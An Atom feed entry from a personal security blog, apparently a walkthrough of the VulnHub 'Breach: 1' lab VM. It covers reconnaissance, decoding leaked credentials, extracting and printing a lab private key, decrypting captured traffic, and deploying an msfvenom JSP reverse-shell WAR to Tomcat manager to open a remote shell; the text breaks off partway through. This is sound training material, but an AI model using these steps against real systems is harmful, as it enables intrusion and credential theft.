<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[F4l13n5n0w]]></title>
  <link href="http://f4l13n5n0w.github.io/atom.xml" rel="self"/>
  <link href="http://f4l13n5n0w.github.io/"/>
  <updated>2020-02-29T17:00:51+11:00</updated>
  <id>http://f4l13n5n0w.github.io/</id>
  <author>
    <name><![CDATA[F4l13n5n0w]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[[VulnHub] Breach: 1]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2016/11/29/vulnhub-breach-1/"/>
    <updated>2016-11-29T22:09:35+11:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2016/11/29/vulnhub-breach-1</id>
    <content type="html"><![CDATA[<p>&ldquo;First in a multi-part series, Breach 1.0 is meant to be beginner to intermediate boot2root/CTF challenge. Solving will take a combination of solid information gathering and persistence. Leave no stone unturned.</p>

<p>The VM is configured with a static IP address (192.168.110.140) so you will need to configure your host-only adaptor to this subnet.&ldquo; &ndash; <a href="https://www.vulnhub.com/author/mrb3n,293/">mrb3n</a></p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/tommy-boy-1,157/">here</a>.</p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali2 Linux (<em>192.168.110.129/24</em>)</p>

<p>Target: PwnLab: init (<em>192.168.110.140/24</em>)</p>

<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
<li><a href="https://github.com/robertdavidgraham/masscan">masscan</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://cirt.net/Nikto2">nikto</a></li>
<li><a href="http://linux.die.net/man/1/nc">nc</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="https://portswigger.net/burp/">burp suite</a></li>
<li><a href="https://www.wireshark.org/">wireshark</a></li>
<li><a href="http://www.sno.phy.queensu.ca/~phil/exiftool/">exiftool</a></li>
<li><a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using <code>arp-scan</code> as routine to detect the target&rsquo;s IP address.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# arp-scan -l
</span><span class='line'>Interface: eth0, datalink <span class="nb">type</span>: EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>
</span><span class='line'>Starting arp-scan 1.9 with <span class="m">256</span> hosts <span class="o">(</span>http://www.nta-monitor.com/tools/arp-scan/<span class="o">)</span>
</span><span class='line'>192.168.110.1 00:50:56:c0:00:08   VMware, Inc.
</span><span class='line'>192.168.110.2 00:50:56:f1:61:7e   VMware, Inc.
</span><span class='line'>192.168.110.128   00:0c:29:5f:3b:1a   VMware, Inc.
</span><span class='line'>192.168.110.140   00:0c:29:f1:0a:9f   VMware, Inc.
</span><span class='line'>192.168.110.254   00:50:56:e9:0a:b5   VMware, Inc.
</span><span class='line'>
</span><span class='line'><span class="m">5</span> packets received by filter, <span class="m">0</span> packets dropped by kernel
</span><span class='line'>Ending arp-scan 1.9: <span class="m">256</span> hosts scanned in 2.421 seconds <span class="o">(</span>105.74 hosts/sec<span class="o">)</span>. <span class="m">5</span> responded
</span></code></pre></td></tr></table></div></figure>


<p><code>192.168.110.140</code> is our Target!</p>

<p>Then run <code>masscan</code> to detect opening ports on the target (masscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<p>Since we got all ports open when doing <code>masscan</code> ports scan, that sounds like the server is located behind an IDS or IPS.</p>

<p>Without the auto-port scanner, I have to check ports manually. So I started from common ports and port 80 would be the first come out~</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/Breach1/1.png"></p>

<p>Good, the target is providing WEB service, so I run <code>nikto</code> to do an auto scan on port 80.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/breach1# nikto -host 192.168.110.140 -output 192.168.110.140_nikto.txt
</span><span class='line'>- Nikto v2.1.6
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Target IP:          192.168.110.140
</span><span class='line'>+ Target Hostname:    192.168.110.140
</span><span class='line'>+ Target Port:        80
</span><span class='line'>+ Start Time:         2016-11-27 14:36:24 <span class="o">(</span>GMT11<span class="o">)</span>
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Server: Apache/2.4.7 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span><span class='line'>+ Server leaks inodes via ETags, header found with file /, fields: 0x44a 0x534a04f49139d
</span><span class='line'>+ The anti-clickjacking X-Frame-Options header is not present.
</span><span class='line'>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
</span><span class='line'>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME <span class="nb">type</span>
</span><span class='line'>+ No CGI Directories found <span class="o">(</span>use <span class="s1">&#39;-C all&#39;</span> to force check all possible <span class="nb">dirs</span><span class="o">)</span>
</span><span class='line'>+ IP address found in the <span class="s1">&#39;location&#39;</span> header. The IP is <span class="s2">&quot;127.0.1.1&quot;</span>.
</span><span class='line'>+ OSVDB-630: IIS may reveal its internal or real IP in the Location header via a request to the /images directory. The value is <span class="s2">&quot;http://127.0.1.1/images/&quot;</span>.
</span><span class='line'>+ Apache/2.4.7 appears to be outdated <span class="o">(</span>current is at least Apache/2.4.12<span class="o">)</span>. Apache 2.0.65 <span class="o">(</span>final release<span class="o">)</span> and 2.2.29 are also current.
</span><span class='line'>+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
</span><span class='line'>+ OSVDB-3268: /images/: Directory indexing found.
</span><span class='line'>+ OSVDB-3268: /images/?pattern<span class="o">=</span>/etc/*<span class="p">&amp;</span><span class="nv">sort</span><span class="o">=</span>name: Directory indexing found.
</span><span class='line'>+ OSVDB-3233: /icons/README: Apache default file found.
</span><span class='line'>+ <span class="m">7535</span> requests: <span class="m">0</span> error<span class="o">(</span>s<span class="o">)</span> and <span class="m">11</span> item<span class="o">(</span>s<span class="o">)</span> reported on remote host
</span><span class='line'>+ End Time:           2016-11-27 14:36:45 <span class="o">(</span>GMT11<span class="o">)</span> <span class="o">(</span><span class="m">21</span> seconds<span class="o">)</span>
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ <span class="m">1</span> host<span class="o">(</span>s<span class="o">)</span> tested
</span></code></pre></td></tr></table></div></figure>


<p>Here is a directory found <code>/images/</code>.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/Breach1/2.png"></p>

<p>Download all the pictures and checked them by using <code>exiftool</code>, found one comment <code>coffeestains</code> in file <code>bill.png</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/breach1/images# exiftool * <span class="p">|</span> grep -i -e <span class="s1">&#39;File Name&#39;</span> -e <span class="s1">&#39;Comment&#39;</span>
</span><span class='line'>File Name                       : bill.png
</span><span class='line'>Comment                         : coffeestains
</span><span class='line'>File Name                       : cake.jpg
</span><span class='line'>File Name                       : initech.jpg
</span><span class='line'>File Name                       : milton_beach.jpg
</span><span class='line'>File Name                       : swingline.jpg
</span><span class='line'>File Name                       : troll.gif
</span></code></pre></td></tr></table></div></figure>


<p>Took a note here, for now.</p>

<p>By checking the source code as follow, I noticed that there is a page called <code>initech.html</code> and some encoded text (looks like base64 encoded) in the comment.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/Breach1/3.png"></p>

<p>After decoded twice of the string <code>Y0dkcFltSnZibk02WkdGdGJtbDBabVZsYkNSbmIyOWtkRzlpWldGbllXNW5KSFJo</code>, I got the plaintext: <code>pgibbons:damnitfeel$goodtobeagang$ta</code> which highly possible to be a pair of username and password divided by <code>:</code>.</p>

<p>Take a note here, the username is <font color='red'><code>pgibbons</code></font> and the password is <font color='red'><code>damnitfeel$goodtobeagang$ta</code></font>.</p>

<p>Then moving on to the new page <code>initech.html</code>.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/Breach1/4.png"></p>

<p><code>Employee portal</code> just outstanding on the menu, so heading into it and using the username and password found before, bingo!!</p>

<p>After get in, there are 3 new emails in the mailbox.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/Breach1/5.png"></p>

<p>Got something suspectable In the 3rd message, and download the secret file <code>.keystore</code>.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/Breach1/6.png"></p>

<p>Keep note here, and then search <code>ssl</code> in order to find more information about the new SSL certificate, and I got another message which disclosed a <code>pcap</code> file link, also the storepassword and keypassword are all set to <font color='red'><code>tomcat</code></font>.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/Breach1/7.png"></p>

<p>Now downloaded the <code>pcap</code> file and opened it using wireshark, all the TCP stream is encrypted, so I need to import a certificate to decrypt.</p>

<p>Then I decided to back to the <code>.keystore</code> file and searched online, got that is tomcat certificate keystore file. Using <code>keytool</code> and the password <code>tomcat</code> to check it.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/breach1# keytool -list -v -keystore keystore
</span><span class='line'>Enter keystore password:
</span><span class='line'>
</span><span class='line'>Keystore <span class="nb">type</span>: JKS
</span><span class='line'>Keystore provider: SUN
</span><span class='line'>
</span><span class='line'>Your keystore contains <span class="m">1</span> entry
</span><span class='line'>
</span><span class='line'>Alias name: tomcat
</span><span class='line'>Creation date: May 21, 2016
</span><span class='line'>Entry <span class="nb">type</span>: PrivateKeyEntry
</span><span class='line'>Certificate chain length: 1
</span><span class='line'>Certificate<span class="o">[</span>1<span class="o">]</span>:
</span><span class='line'>Owner: <span class="nv">CN</span><span class="o">=</span>Unknown, <span class="nv">OU</span><span class="o">=</span>Unknown, <span class="nv">O</span><span class="o">=</span>Unknown, <span class="nv">L</span><span class="o">=</span>Unknown, <span class="nv">ST</span><span class="o">=</span>Unknown, <span class="nv">C</span><span class="o">=</span>Unknown
</span><span class='line'>Issuer: <span class="nv">CN</span><span class="o">=</span>Unknown, <span class="nv">OU</span><span class="o">=</span>Unknown, <span class="nv">O</span><span class="o">=</span>Unknown, <span class="nv">L</span><span class="o">=</span>Unknown, <span class="nv">ST</span><span class="o">=</span>Unknown, <span class="nv">C</span><span class="o">=</span>Unknown
</span><span class='line'>Serial number: 60856e88
</span><span class='line'>Valid from: Sat May <span class="m">21</span> 03:51:07 AEST <span class="m">2016</span> <span class="k">until</span>: Fri Aug <span class="m">19</span> 03:51:07 AEST 2016
</span><span class='line'>Certificate fingerprints:
</span><span class='line'>   MD5:  C4:72:E6:B0:5F:58:CE:8B:B4:7E:2D:67:86:A9:52:A0
</span><span class='line'>   SHA1: D5:D2:49:C3:69:93:CC:E5:39:A9:DE:5C:91:DC:F1:26:A6:40:46:53
</span><span class='line'>   SHA256: F0:4A:E8:7F:52:C1:78:B4:14:2B:4D:D9:1A:34:31:F7:19:0A:29:F6:0C:85:00:0B:58:3A:37:20:6C:7E:E6:31
</span><span class='line'>   Signature algorithm name: SHA256withRSA
</span><span class='line'>   Version: 3
</span><span class='line'>
</span><span class='line'>Extensions:
</span><span class='line'>
</span><span class='line'><span class="c">#1: ObjectId: 2.5.29.14 Criticality=false</span>
</span><span class='line'>SubjectKeyIdentifier <span class="o">[</span>
</span><span class='line'>KeyIdentifier <span class="o">[</span>
</span><span class='line'>0000: <span class="m">47</span> 6B A3 <span class="m">37</span> ED A5 1F 0A   0D <span class="m">61</span> CA AA <span class="m">17</span> 9C F4 8C  Gk.7.....a......
</span><span class='line'>0010: <span class="m">10</span> <span class="m">64</span> <span class="m">87</span> DF                                        .d..
</span><span class='line'><span class="o">]</span>
</span><span class='line'><span class="o">]</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>*******************************************
</span><span class='line'>*******************************************
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>root@kali:~/myExercises/breach1#
</span></code></pre></td></tr></table></div></figure>


<p>Then trying to extract private key from the <code>keystore</code> <a href="http://stackoverflow.com/questions/2640691/how-to-export-private-key-from-a-keystore-of-self-signed-certificate" title="Export private key from keystore file">file</a>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/breach1# keytool -v -importkeystore -srckeystore keystore -srcalias tomcat -destkeystore myp12file.p12 -deststoretype PKCS12
</span><span class='line'>Enter destination keystore password:
</span><span class='line'>Re-enter new password:
</span><span class='line'>Enter <span class="nb">source </span>keystore password:
</span><span class='line'><span class="o">[</span>Storing myp12file.p12<span class="o">]</span>
</span><span class='line'>root@kali:~/myExercises/breach1# ls
</span><span class='line'>keystore  myp12file.p12  _SSL_test_phase1.pcap
</span></code></pre></td></tr></table></div></figure>


<p>check the private key:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/breach1# openssl pkcs12 -in myp12file.p12 -nocerts -nodes
</span><span class='line'>Enter Import Password:
</span><span class='line'>MAC verified OK
</span><span class='line'>Bag Attributes
</span><span class='line'>    friendlyName: tomcat
</span><span class='line'>    localKeyID: <span class="m">54</span> <span class="m">69</span> 6D <span class="m">65</span> <span class="m">20</span> <span class="m">31</span> <span class="m">34</span> <span class="m">38</span> <span class="m">30</span> <span class="m">31</span> <span class="m">34</span> <span class="m">34</span> <span class="m">33</span> <span class="m">35</span> <span class="m">37</span> <span class="m">32</span> <span class="m">36</span> <span class="m">35</span>
</span><span class='line'>Key Attributes: &lt;No Attributes&gt;
</span><span class='line'>-----BEGIN PRIVATE KEY-----
</span><span class='line'>MIIEvwIBADANBgkqhkiG9w0BAQEFAASCBKkwggSlAgEAAoIBAQCjJXnELHvCEyTT
</span><span class='line'>ZW/cJb7sFuwIUy5l5DkBXD9hBgRtpUSIv9he5RbJQwGuwyw5URbm3pa7z1eoRjFW
</span><span class='line'>HLMVzKYte6AyyjUoWcc/Fs9fiu83+F0G36JmmFcxLFivVQwCHKhrajUc15i/XtCr
</span><span class='line'>ExEDNL0igM8YnCPq4J9lXrXUanLltR464F7cJdLbkqHiqRvoFiOQi9e3CIZ86uoY
</span><span class='line'>UNBupj2/njMFRuB7dEoeaQ/otHZIgCgjbP76I+/xyL/RkGxYuU0e1tpQiLxTi7kF
</span><span class='line'>nJ1Rd55Gd+DvzuBiI9F+fxa4+TSQvRvQEzJIKowbPw6h82Cd66yFju8c2AKiaDie
</span><span class='line'>F+AqVim3AgMBAAECggEBAIr2Ssdr1GY0hDODvUnY5MyXoahdobGsOVoNRvbPd0ol
</span><span class='line'>cUDBl/0MSOJZLr+7Apo3lbhEdEO4kkOEtlVQ0MGKtSkcmhFo5updvjbgqPYKk0Qr
</span><span class='line'>SqGmLuAQdoQt78Q4Pqg13MbRijfs8/BdRIPTE7SVYVxYNw4RQQ65EUv45gvuN7ur
</span><span class='line'>shV5WSHVaN5QyUHyOTKcvFuBqxb9Mfo2NtRGZCG2QuG8V/C+k2k8+Q+n2wDaOXw8
</span><span class='line'>sIWKVMHngOMcW1OBnM3ac/bTeI2+LI5cMsBZqYlLmkH1AOlnCgpH7389NbRQQJSo
</span><span class='line'>sExX51v5r2mmI1JdzszwQYqRfH7+nugDRjBEN2ztqFECgYEA4eBiLFP9MeLhjti8
</span><span class='line'>PDElSG4MVf/I9WXfLDU79hev7npRw8LE0rzPgawXOL8NhTbp8/X1D071bGaA3rCU
</span><span class='line'>oBEEPclXlSwXHroZVjJALDhaPrIfFT6gBXlb9wAYSzWYED4LKXDuddVChrTo4Lmx
</span><span class='line'>XaHb/KM7kpPuUWr+xccEEuNJBnMCgYEAuOduxGz2Ecd+nwATsZpjgG5/SwLL/rd0
</span><span class='line'>TEMNQbB/XUIOI8mZpw5Dn1y71qCijk/A+oVzohc6Dspso4oXLMy0b+HCFPTKuGgg
</span><span class='line'>Hf8QV5YbDg0urH8KNNEEH7Dx/C6cp6vVAcj6eQ2wOwW62yVY8gy2elWH0gte1BXl
</span><span class='line'>hHiKIaLueq0CgYEAoAwi4+/7Ny7gzhvKfQgBt+mqOgGM/jzZvnRV8VDlayAm8YP/
</span><span class='line'>fKcmjWZH6gCN7vdzHFcJ9nfnNJEI/UG3fhewnqscsOlV1ILe0xG2IN8pKsWBescu
</span><span class='line'>EdLlFAZwMFJgVhnwRMPtY3bhtZtYa2uIPqUiwEdVPc4uDmi276LNwyhjJPsCgYA7
</span><span class='line'>ANcO5TpMiB12vX6LURnpVNlX5WeVO5Nn9omXaavq5XY/o0hdz6ZyhxQFtDLLONX6
</span><span class='line'>23T/x2umZp/uO9WTXStC/IaDS24ZFFkTWV4spOCzRi+bqdpm6j/noP5HG9SviJyr
</span><span class='line'>Oif7Uwvmebibz7onWzkrpnl15Fz5Tpd0A0cI3sY87QKBgQDLZ9pl505OMHOyY6Xr
</span><span class='line'>geszoeaj4cQrRF5MO2+ad81LT3yoLjZyARaJJMEAE7FZxPascemlg9KR3JPnevIU
</span><span class='line'>3RdMGHX75yr92Sd8lNQvSO6RWUuRnc889xN1YrpPx5G1VppIFqTrcB0gAiREkeUA
</span><span class='line'>pHiPhbocjixKJz9xx+pG0jDkrg<span class="o">==</span>
</span><span class='line'>-----END PRIVATE KEY-----
</span><span class='line'>root@kali:~/myExercises/breach1#
</span></code></pre></td></tr></table></div></figure>


<p>Now I will <a href="https://support.citrix.com/article/CTX116557" title="Decrypt SSL/TLS Traffic using wireshark">import the Private key file</a> into <code>wireshark</code> in order to decrypt the SSL stream.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/Breach1/8.png"></p>

<p>After imported the private key, I have to re-open the <code>pcap</code> file in wireshark, now the traffic is quite clear, then right click in wireshark and choose <code>Follow</code> &ndash;> <code>SSL Stream</code> to read the traffic clearly.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/Breach1/9.png"></p>

<p>From here, got a HTTP Basic login credential in base64 encoded: <code>dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC</code>.</p>

<p>After decoded it, i got the plaintext: <code>tomcat:Tt\5D8F(#!*u=G)4m7zB</code>, which username is <font color='red'><code>tomcat</code></font> and password is <font color='red'><code>Tt\5D8F(#!*u=G)4m7zB</code></font>.</p>

<p>And based on the first two lines above, the login URL should be <font color='red'><code>https://192.168.110.140:8443/_M@nag3Me/html</code></font>.</p>

<p>[<font color='red'>Note</font>] Here I could not load the page correctly via firefox directly, but when I use <code>burp proxy</code> as a proxy, I was able to add exception in the firefox to access the tomcat page.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/Breach1/10.png"></p>

<p>Now I got in, from here, I could generate and upload an evil <code>.WAR</code> file or use metasploit to exploit automatically.</p>

<p>Using <code>msfvenom</code> to generate a WAR webshell by following commond [3]:</p>

<p><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.110.129 LPORT=443 -f war &gt; shell.war</code></p>

<p>Then setup <code>msfconsole</code> to listen on and got a reverse shell back as soon as I triggerred.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>smsf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; show options
</span><span class='line'>
</span><span class='line'>Module options <span class="o">(</span>exploit/multi/handler<span class="o">)</span>:
</span><span class='line'>
</span><span class='line'>   Name  Current Setting  Required  Description
</span><span class='line'>   ----  ---------------  --------  -----------
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Payload options <span class="o">(</span>java/jsp_shell_reverse_tcp<span class="o">)</span>:
</span><span class='line'>
</span><span class='line'>   Name   Current Setting  Required  Description
</span><span class='line'>   ----   ---------------  --------  -----------
</span><span class='line'>   LHOST  192.168.110.129  yes       The listen address
</span><span class='line'>   LPORT  <span class="m">443</span>              yes       The listen port
</span><span class='line'>   SHELL                   no        The system shell to use.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   <span class="m">0</span>   Wildcard Target
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; exploit
</span><span class='line'>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 192.168.110.129:443
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Starting the payload handler...
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Command shell session <span class="m">4</span> opened <span class="o">(</span>192.168.110.129:443 -&gt; 192.168.110.140:37620<span class="o">)</span> at 2016-11-27 14:17:25 +1100
</span><span class='line'>
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>104<span class="o">(</span>tomcat6<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>112<span class="o">(</span>tomcat6<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>112<span class="o">(</span>tomcat6<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Great! got in. However, after spended couple of hours looking around in the system, I could not get any further.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>tomcat6@Breach:/home/milton<span class="nv">$ </span>s -al
</span><span class='line'>ls -al
</span><span class='line'>total 156
</span><span class='line'>drwxr-xr-x <span class="m">3</span> milton milton   <span class="m">4096</span> Jun  <span class="m">6</span> 15:34 .
</span><span class='line'>drwxr-xr-x <span class="m">4</span> root   root     <span class="m">4096</span> Jun  <span class="m">4</span> 19:24 ..
</span><span class='line'>-rw------- <span class="m">1</span> milton milton    <span class="m">234</span> Jun <span class="m">11</span> 18:15 .bash_history
</span><span class='line'>-rw-r--r-- <span class="m">1</span> milton milton    <span class="m">220</span> May <span class="m">20</span>  <span class="m">2016</span> .bash_logout
</span><span class='line'>-rw-r--r-- <span class="m">1</span> milton milton   <span class="m">3637</span> May <span class="m">20</span>  <span class="m">2016</span> .bashrc
</span><span class='line'>drwx------ <span class="m">2</span> milton milton   <span class="m">4096</span> May <span class="m">20</span>  <span class="m">2016</span> .cache
</span><span class='line'>-rw-rw-r-- <span class="m">1</span> milton milton   <span class="m">2245</span> May <span class="m">20</span>  <span class="m">2016</span> .keystore
</span><span class='line'>-rw-rw-r-- <span class="m">1</span> milton milton <span class="m">111255</span> Jun  <span class="m">4</span> 18:46 my_badge.jpg
</span><span class='line'>-rw------- <span class="m">1</span> milton milton    <span class="m">407</span> Jun  <span class="m">4</span> 18:18 .mysql_history
</span><span class='line'>-rw-r--r-- <span class="m">1</span> milton milton    <span class="m">675</span> May <span class="m">20</span>  <span class="m">2016</span> .profile
</span><span class='line'>-rw-r--r-- <span class="m">1</span> root   root       <span class="m">66</span> Jun  <span class="m">4</span> 10:57 .selected_editor
</span><span class='line'>-rwxrwxrwx <span class="m">1</span> milton milton    <span class="m">755</span> Jun  <span class="m">4</span> 10:51 some_script.sh
</span><span class='line'>
</span><span class='line'>tomcat6@Breach:/home/milton<span class="nv">$ </span>cat some_script.sh
</span><span class='line'>cat some_script.sh
</span><span class='line'>
</span><span class='line'>
</span><span class='line'> _____ _                   _                   _   _     _               _
</span><span class='line'><span class="p">|</span>_   _<span class="p">|</span> <span class="p">|</span>                 <span class="o">(</span> <span class="o">)</span>                 <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>   <span class="o">(</span>_<span class="o">)</span>             <span class="p">|</span> <span class="p">|</span>
</span><span class='line'>  <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>__   ___ _ __ ___<span class="p">|</span>/ ___   _ __   ___ <span class="p">|</span> <span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>__  _ _ __   __ _  <span class="p">|</span> <span class="p">|</span>__   ___ _ __ ___
